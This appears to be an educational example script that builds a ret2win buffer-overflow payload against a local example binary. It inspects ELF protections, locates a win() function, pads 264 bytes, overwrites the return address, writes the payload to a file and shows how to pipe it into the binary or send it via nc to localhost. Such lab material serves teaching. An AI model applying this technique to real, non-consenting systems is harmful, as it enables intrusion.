print("[*] Basic Buffer Overflow Exploitation")
print("=" * 50)

let binary_path = "examples/vuln_binary"

print("\n[*] Step 1: Analyzing target binary...")
let elf = Elf(binary_path)
print("Binary path:", elf["path"])
print("Base address:", hex(elf["base_addr"]))
print("PIE enabled:", elf["pie"])
print("NX enabled:", elf["nx"])
print("Stack canary:", elf["canary"])

print("\n[*] Step 2: Locating win() function...")
let win_addr = elf["symbols"]["win"]
print("win() at:", hex(win_addr))

print("\n[*] Step 3: Finding buffer overflow offset...")
print("Buffer size: 256 bytes")
print("Overflow offset: 264 bytes (256 buffer + 8 RBP)")

print("\n[*] Step 4: Building exploit payload...")
let offset = 264
let padding = cyclic(offset)
let payload = padding + p64(win_addr)

print("Payload size:", len(payload), "bytes")
print("Padding:", offset, "bytes")
print("Return address:", hex(win_addr))

print("\n[*] Step 5: Writing payload to file...")
write("exploit_payload.bin", payload)
print("Exploit written to: exploit_payload.bin")

print("\n[+] Exploit payload ready!")
print("\n[*] To test the exploit:")
print("    1. Start the server: ./examples/vuln_binary")
print("    2. Send payload: cat exploit_payload.bin | nc localhost 9999")
print("    3. Or pipe directly: cat exploit_payload.bin | ./examples/vuln_binary")
